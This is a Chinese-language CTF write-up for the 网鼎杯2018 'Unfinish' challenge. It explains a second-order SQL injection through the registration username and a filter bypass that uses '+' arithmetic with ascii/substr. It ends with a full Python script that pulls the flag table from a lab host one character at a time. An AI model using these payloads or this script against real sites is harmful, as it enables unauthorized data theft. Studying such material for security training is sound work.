---
title: 网鼎杯2018-Unfinish
date: 2025-04-14 17:16:41
tags:
- 二次注入
- sql盲注
- sql加号运算注入
category:
- 刷题笔记
---

# 网鼎杯2018-Unfinish

首先是一个登录页面，但是没有发现注入点，然后扫一下发现register.php即注册页面。

我们随便注册一个账号，然后就能登录进去了，登录进去发现会回显用户名，其他啥也没有，很明显是二次注入

我们返回注册页面，设置用户名

```
1'and'1
```

然后再登录查看用户名，发现用户名变为了1

我们猜测后台注册sql语句为
`insert into tables values('$email','$username','$password')`

如果username输入1' and '1 

就变为了`insert into tables values('$email','1' and '1','$password')`

然后username在数据库里就变为了1

---

但是这里过滤了很多东西，包括information、注释符

但是这题可以通过"+"运算来

sql语句中+进行运算的用法

比如

select '1'+'1';-->2

select '0'+'database()';-->0

但我们能把查询出来的用acii值转换为数字

这样就能进行+运算了

select '0'+ascii(substr(database(),1,1));
->115

所以构造

```
0'+ascii(substr((select * from flag) from {} for 1))+'0

由于逗号被过滤了，只能用from ... for ... 的形式
而且由于不知道表名只能盲猜表名为flag
注释符被过滤了不能用一般的盲注，且需要手动闭合
```

完整脚本

```
# coding:utf-8
import requests
from bs4 import BeautifulSoup
import time

url = 'http://e18d89d1-39c0-418c-b79d-8693dbee6727.node5.buuoj.cn:81/'

m = ''
for i in range(100):
    # payload = "0'+ascii(substr((select database()) from {} for 1))+'0".format(i + 1)
    payload = "0'+ascii(substr((select * from flag) from {} for 1))+'0".format(i + 1)  # 判断每一位ascii码是多少
    register = {'email': 'abc{}@qq.com'.format(i), 'username': payload, 'password': '123456'}
    login = {'email': 'abc{}@qq.com'.format(i), 'password': '123456'}
    req = requests.session()
    r1 = req.post(url + 'register.php', data=register)
    r2 = req.post(url + 'login.php', data=login)
    r3 = req.post(url + 'index.php')
    html = r3.text
    # print(html)
    soup = BeautifulSoup(html, 'html.parser')
    # print(soup.prettify())
    UserName = soup.span.string
    print(UserName)
    if int(UserName) == 0:
        break
    m += chr(int(UserName))
    print(m)
    time.sleep(1)
```

